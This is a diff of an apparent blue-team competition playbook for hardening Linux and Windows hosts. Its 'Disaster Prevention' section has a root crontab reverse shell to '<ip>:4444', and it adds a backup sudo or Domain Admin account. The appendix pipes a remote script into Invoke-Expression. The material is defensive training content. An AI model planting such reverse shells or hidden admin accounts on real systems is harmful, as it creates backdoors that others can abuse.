@@ -19,17 +19,16 @@
 
 **Do not touch the** `seccdc_black` **account**
 
-## Initial Action Plan
+## Action Plan
 
-1. [NMAP Scan Machine](#nmap) in background
-2. [Backup files](#backups)
-3. Rotate ssh keys
+1. [Backup files](#backups)
+2. Rotate ssh keys
     1. Get ssh key from Linux captain called `team-key`
 	2. Copy `team-key.pub` to server via scp or copy-and-paste
 	3. Set ssh key: `cat team-key.pub > ~/.ssh/authorized_keys`
 	4. Open a new SSH session to ensure it works
 
-4. Create a backup account called `grimace`
+3. Create a backup account called `grimace`
 	1. `sudo useradd -m -s /bin/bash -G sudo,wheel,adm grimace`
 	2. Set password to password provided by Linux captain `sudo passwd grimace`
 	3. Add new ssh key to grimace's authorized keys
@@ -39,13 +38,30 @@
 		4. Set permissions: `chmod 600 ~/.ssh/authorized_keys`
 	4. SSH into grimace to ensure it works
 
-5. Check local accounts and reset password **ASAP** using appropriate one liners from [Duncan's Magic](#dmagic)
-6. Lock unnecessary accounts with `sudo usermod -L <account>` and if nothing goes red, delete account with `sudo userdel <login>`. Or use appropriate one liners from [Duncan's Magic](#dmagic) to lock accounts
+4. Check local accounts and reset password **ASAP** using appropriate one liners from [Duncan's Magic](#dmagic)
+5. Lock unnecessary accounts with `sudo usermod -L <account>` and if nothing goes red, delete account with `sudo userdel <login>`. Or use appropriate one liners from [Duncan's Magic](#dmagic) to lock accounts
     1. **NOTE**: user home directories were intentionally not deleted with the `userdel` command with the idea of possible needing that data for future injects (you never know). \
 	If you absolutely need to remove extraneous user home directories, seek approval from the team captain before proceeding with the command `userdel -r <login>`
 
-7. Follow steps in [disaster prevention](#disaster-prevention)
-8. Find listening services with `sudo ss -tunlp` and investigate
+6. Carry on the following sections in order
+
+## Backups
+
+1. Look for csv's and import scripts in home dir
+2. Backups data directory with `tar czf var-lib.tar.gz /var/lib &`
+3. Backups conf directory with `tar czf etc.tar.gz /etc &`
+4. Copy tar files to local machine with `scp '<remote>:*.tar.gz' .` (run command on local machine)
+
+## Disaster Prevention
+
+1. Open multiple ssh sessions to different users
+2. Add SSH key to multiple users, such as root
+3. Determine your IP, and place the line below in root's crontab
+	1. On your localhost you can listen to port 4444 to catch the shell
+
+``` crontab
+* * * * * /bin/bash -i >& /dev/tcp/<ip>/4444 0>&1
+```
 
 ## Monitoring
 
@@ -63,13 +79,6 @@
     3. Watch logs with `journalctl -kf –grep="OUT=.*"`
 
 7. Watch dbus with `dbus -w`
-
-## Backups
-
-1. Look for csv's and import scripts in home dir
-2. Backups data directory with `tar czf var-lib.tar.gz /var/lib &`
-3. Backups conf directory with `tar czf etc.tar.gz /etc &`
-4. Copy tar files to local machine with `scp '<remote>:*.tar.gz' .` (run command on local machine)
 
 ## Firewall
 
@@ -102,16 +111,17 @@ COMMIT
 4. Apply with `sudo iptables-apply`
 5. Ensure new SSH sessions may be opened
 
-## Disaster Prevention
+## Hunting
 
-1. Open multiple ssh sessions to different users
-2. Add SSH key to multiple users, such as root
-3. Determine your IP, and place the line below in root's crontab
-	1. On your localhost you can listen to port 4444 to catch the shell
+1. Find a process's parent ID with `ps -f <pid>` and look at `PPID`
+2. Find binaries with suid bit executable by anyone `find / -perm -+s,o+x`
+	1. `/usr/bin/mount.cifs` and `/usr/bin/unix_chkpwd` are suppose to have this bit set
+3. List all files with creation date, most recent first: `find /usr /bin /etc \` \
+    `/var -type f -exec stat -c "%W %n" {} + | sort -r > files`
 
-``` crontab
-* * * * * /bin/bash -i >& /dev/tcp/<ip>/4444 0>&1
-```
+4. List all files created after set date, most recent first: \
+    `find /usr /bin /etc /var -type f -newermt <YYYY-MM-DD> -exec \` \
+    `stat -c "%W %n" {} + | sort -rn > files`
 
 ## Disaster Recovery
 
@@ -128,18 +138,6 @@ COMMIT
     1. **Alert the team**
     2. [Start nmap scan](#nmap)
     3. Try verbose ssh `ssh -v <user>@<ip>`
-
-## Hunting
-
-1. Find a process's parent ID with `ps -f <pid>` and look at `PPID`
-2. Find binaries with suid bit executable by anyone `find / -perm -+s,o+x`
-	1. `/usr/bin/mount.cifs` and `/usr/bin/unix_chkpwd` are suppose to have this bit set
-3. List all files with creation date, most recent first: `find /usr /bin /etc \` \
-    `/var -type f -exec stat -c "%W %n" {} + | sort -r > files`
-
-4. List all files created after set date, most recent first: \
-    `find /usr /bin /etc /var -type f -newermt <YYYY-MM-DD> -exec \` \
-    `stat -c "%W %n" {} + | sort -rn > files`
 
 ## Duncan's Magic {#dmagic}
 
@@ -268,11 +266,11 @@ net user <USERNAME> <NEW PASSWORD>
 3. Create a new domain user named Grimace with **the password provided to you**.
 ```powershell
 # creating user and adding to group
-new-aduser "Grimace" -Enabled $true -AccountPassword (Read-Host -AsSecureString) 
+new-aduser "Grimace" -Enabled $true -AccountPassword (Read-Host -AsSecureString)
 add-adgroupmember -Identity "Domain Admins" -Members "Grimace"
 ```
 
-4. Generate passwords for domain users with [scripts](#windows-scripts) and backup off the machine. **Wait to reset passwords until directed by captain.** 
+4. Generate passwords for domain users with [scripts](#windows-scripts) and backup off the machine. **Wait to reset passwords until directed by captain.**
 
 5. Audit members of `Domain Admins` and `Enterprise Admins` groups with [scripts](#windows-scripts).
 
@@ -293,7 +291,7 @@ echo "<PUBKEY>" | set-content C:\Users\Grimace\.ssh\authorized_keys
 2. Audit local users (if any) with [scripts](#windows-scripts).
 
 3. Key Management
-    1. Find and remove unauthorized SSH keys. 
+    1. Find and remove unauthorized SSH keys.
 ```powershell
 # search for keys in the Users directory
 dir C:\Users -Force -Recurse -Filter "authorized_keys"
@@ -320,17 +318,17 @@ compress-archive C:\temp\* -destinationpath backup.zip
 
 5. After network discovery completes, configure Firewall.
 
-    1.  Export current firewall policy.  
+    1.  Export current firewall policy.
 ```powershell
 netsh advfirewall export "C:\rules.wfw"
 ```
 
-    2.  Disable firewall.  
+    2.  Disable firewall.
 ```powershell
 netsh advfirewall set allprofiles state off
 ```
 
-    3.  Flush unneeded inbound/outbound rules.  
+    3.  Flush unneeded inbound/outbound rules.
 ```powershell
 # use this on a domain controller
 $rules = get-netfirewallrule | ? {
@@ -389,7 +387,7 @@ set allprofiles logging droppedconnections enable
 7. Proceed to [Hunting](#hunting-1).
 
 8. Proceed to [Monitoring](#monitoring-1).
-   
+
 ## Windows Scripts
 
 1.  Generate CSV file with passwords:
@@ -452,7 +450,7 @@ get-content "unexpected.txt" | foreach {net user $_ /active:no}
 
 ## Hardening
 
-1. Confirm that there are no Password Filters or Security Packages in place. **If any exist, remove them and restart the machine.** 
+1. Confirm that there are no Password Filters or Security Packages in place. **If any exist, remove them and restart the machine.**
 ```powershell
 # password filters (should only show scecli and rassfm)
 get-itemproperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages"
@@ -463,20 +461,20 @@ get-itemproperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Security Package
 
 2. Service Management:
 
-    1.  Disable Print Spooler.    
+    1.  Disable Print Spooler.
         `Set-Service -Name "Spooler" -Status stopped -StartupType disabled -Force`
 
-    2.  Disable WinRM.  
+    2.  Disable WinRM.
         `Set-Service -Name "WinRM" -Status stopped -StartupType disabled -Force`
 
     3.  Configure SMB:
 
-        1.  If SMB is unneeded (i.e. not in an AD setting), disable it entirely.  
+        1.  If SMB is unneeded (i.e. not in an AD setting), disable it entirely.
             `Set-Service -Name "LanmanServer" -Status stopped -StartupType disabled`
 
         2.  If SMB is needed, do the following:
 
-            1. Disable SMBv1.  
+            1. Disable SMBv1.
                 `Set-SmbServerConfiguration -EnableSMB1Protocol $False -Force`
 
             2. Disable SMB Compression:
@@ -506,7 +504,7 @@ get-itemproperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Security Package
                 - Microsoft network client: Digitally sign communications (always)
                 - Microsoft network server: Digitally sign communications (always)
                 - Domain member: Digitally encrypt or sign secure channel data (always)
-            4. `Computer Configuration > Admininstrative Templates > System > Remote Procedure Call` 
+            4. `Computer Configuration > Admininstrative Templates > System > Remote Procedure Call`
                 - Restrictions for Unauthenticated RPC Clients: Authenticated
         3. Registry:
             1. Prevent Plaintext Storage of Credentials:
@@ -520,7 +518,7 @@ get-itemproperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Security Package
     * Audit Policy
         1.  Powershell Block/Module Logging: `Administrative Templates > Windows Components > Windows Powershell`
     * After policy has been configured and enforced, run `gpupdate /force` on each machine in the domin.
-   
+
 ## Logging
 
 1.  Configure Sysmon with [our config](https://raw.githubusercontent.com/D42H5/cyber_comp_resources/main/sysmonconfig-export-modified-2-2-24.xml).
@@ -538,13 +536,13 @@ get-itemproperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Security Package
 2. Check for any connected user sessions and terminate unknown ones.
     1.  View all connected RDP sessions with `qwinsta` and kill sessions with `rwinsta <SESSION ID>`.
 
-    2.  View SSH sessions `get-process -includeusername | ? {$_.ProcessName -like "sshd"}`. Kill a process with `taskkill /f /pid <PID>`. **The SYSTEM sshd process should not be killed.** 
-    
+    2.  View SSH sessions `get-process -includeusername | ? {$_.ProcessName -like "sshd"}`. Kill a process with `taskkill /f /pid <PID>`. **The SYSTEM sshd process should not be killed.**
+
 3. Use BLUESPAWN (and optionally DEEPGLASS) to audit the system for backdoors.
     1. `BLUESPAWN.exe -h` will do a one-pass scan for MITRE ATT&CK indicators.
 
     2. `BLUESPAWN.exe -m` will monitor for indicators and can actively remediate them.
-    
+
     3. `DEEPGLASS.exe` will scan the file system and registry for suspicious files.
 
 4. Startup items and registry run keys should be checked with Autoruns.
@@ -569,7 +567,7 @@ HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce\
 HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
 ```
 ```
-HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\ 
+HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\
 HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\
 HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\
 HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\
@@ -626,7 +624,7 @@ HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
 * Password Filters
     - Used to harvest creds anytime a password is changed. Should only contain sceli & rassfm as notification Packages.
 ```
-HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Notification 
+HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Notification
 ```
 
 * Winlogon Helper DLL
@@ -640,7 +638,7 @@ HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
 ```
 
 * Services
-    - Service configuration info is stored in keys in this folder. 
+    - Service configuration info is stored in keys in this folder.
 ```
 HKLM:\SYSTEM\CurrentControlSet\Services
 ```
@@ -664,7 +662,7 @@ compare-object -referenceobject (get-scheduledtask | select-object -expandproper
 * Sticky keys
 * Web shells
 * Malicious accounts
-* Golden ticket 
+* Golden ticket
 * Keylogger
 
 ## Monitoring
@@ -677,6 +675,68 @@ compare-object -referenceobject (get-scheduledtask | select-object -expandproper
 3.  View all shares with `net share` and connected Named Pipes / Shares with `net use`.
 
 4.  Monitor the Event Logs for unexpected activity.
+
+## Appendix
+
+### Helpful Windows Utilities
+
+**NOTE** If using powershell to curl, you will need to run the following to enable TLS:
+`[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`
+
+1.  For package management (Scoop):
+```powershell
+Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser;
+Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression
+```
+
+2.  For system logging and monitoring:
+    [Sysinternals Suite](https://download.sysinternals.com/files/SysinternalsSuite.zip)
+    [Sysmon Config](https://raw.githubusercontent.com/D42H5/cyber_comp_resources/main/sysmonconfig-export-modified-2-2-24.xml)
+    [EventLogViewer](https://www.nirsoft.net/utils/fulleventlogview-x64.zip)
+
+3.  For antivirus scanning:
+    [Microsoft Safety Scanner](https://go.microsoft.com/fwlink/?LinkId=212732) (portable)
+    [Malwarebytes](https://downloads.malwarebytes.com/file/mb-windows) (requires install)
+
+4.  For environment auditing:
+    [PingCastle](https://github.com/vletoux/pingcastle/releases/download/3.2.0.1/PingCastle_3.2.0.1.zip)
+
+### Active Directory Reference
+
+#### Hardening
+
+1.  The krbtgt password should be reset periodically with this [password reset script](https://github.com/microsoft/New-KrbtgtKeys.ps1).
+
+2.  You can force a reset of domain group policy with the below commands:
+```powershell
+dcgpofix /target:both
+gpupdate /force
+```
+
+### Powershell Reference
+
+#### Useful Cmdlets
+
+* get-localuser : Lists local users on the system
+* get-aduser -Filter "*" : lists domain users
+* get-adcomputer -Filter "*" -properties IPv4Address : lists domain computers
+* get-process : Lists currently running processes
+* get-nettcpconnection : Lists currently listening/established TCP channels
+* get-netudpendpoint : Lists currenrly listening UDP endpoints
+* get-childitem -force : Lists all items (including hidden) in the current directory
+
+#### Sample Commands
+
+List all processes owned by SYSTEM that are listening for network connections:
+```powershell
+Get-process -IncludeUsername |
+foreach {
+    if ($_.UserName -like "*SYSTEM*") {
+        $con = Get-nettcpconnection -State Listen -ErrorAction SilentlyContinue -OwningProcess $_.Id;
+        if ($con -ne $null) {"{0} {1} {2}" -f $con.LocalPort,$_.Id,$_.ProcessName}
+    }
+}
+```
 
 # Services
 
@@ -718,8 +778,11 @@ DROP USER '<USERNAME>'@'<HOST>';
 
 ## SSH
 
-1.  You can tunnel a port over ssh with the following syntax:  
-    `ssh -L <LPORT>:<RHOST>:<RPORT> <USER>@<RHOST>`
+1.  You can tunnel a port over ssh with the following syntax: \
+    `ssh -L <LPORT>:<RHOST>:<RPORT> <USER>@<RHOST>` \
+	To access port 3000 on the remote, use the command \
+	`ssh -L 3000:127.0.0.1:3000 <user>@<host>` \
+	and then access port 3000 on your localhost
 
 ## Web Servers
 
@@ -748,66 +811,4 @@ disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl
 file_uploads=off
 allow_url_fopen=off
 allow_url_include=off
-```
-
-# Appendix
-
-## Helpful Windows Utilities
-
-**NOTE** If using powershell to curl, you will need to run the following to enable TLS:  
-`[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`
-
-1.  For package management (Scoop):
-```powershell
-Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser;
-Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression
-```
-
-2.  For system logging and monitoring:
-    [Sysinternals Suite](https://download.sysinternals.com/files/SysinternalsSuite.zip)  
-    [Sysmon Config](https://raw.githubusercontent.com/D42H5/cyber_comp_resources/main/sysmonconfig-export-modified-2-2-24.xml)  
-    [EventLogViewer](https://www.nirsoft.net/utils/fulleventlogview-x64.zip)  
-
-3.  For antivirus scanning:  
-    [Microsoft Safety Scanner](https://go.microsoft.com/fwlink/?LinkId=212732) (portable)  
-    [Malwarebytes](https://downloads.malwarebytes.com/file/mb-windows) (requires install)  
-
-4.  For environment auditing:
-    [PingCastle](https://github.com/vletoux/pingcastle/releases/download/3.2.0.1/PingCastle_3.2.0.1.zip)
-
-## Active Directory Reference
-
-### Hardening
-
-1.  The krbtgt password should be reset periodically with this [password reset script](https://github.com/microsoft/New-KrbtgtKeys.ps1).
-
-2.  You can force a reset of domain group policy with the below commands:
-```powershell
-dcgpofix /target:both
-gpupdate /force
-```
-
-## Powershell Reference
-
-### Useful Cmdlets
-
-* get-localuser : Lists local users on the system
-* get-aduser -Filter "*" : lists domain users
-* get-adcomputer -Filter "*" -properties IPv4Address : lists domain computers
-* get-process : Lists currently running processes
-* get-nettcpconnection : Lists currently listening/established TCP channels
-* get-netudpendpoint : Lists currenrly listening UDP endpoints
-* get-childitem -force : Lists all items (including hidden) in the current directory
-
-### Sample Commands
-
-List all processes owned by SYSTEM that are listening for network connections:
-```powershell
-Get-process -IncludeUsername |
-foreach {
-    if ($_.UserName -like "*SYSTEM*") {
-        $con = Get-nettcpconnection -State Listen -ErrorAction SilentlyContinue -OwningProcess $_.Id;
-        if ($con -ne $null) {"{0} {1} {2}" -f $con.LocalPort,$_.Id,$_.ProcessName}
-    }
-}
 ```
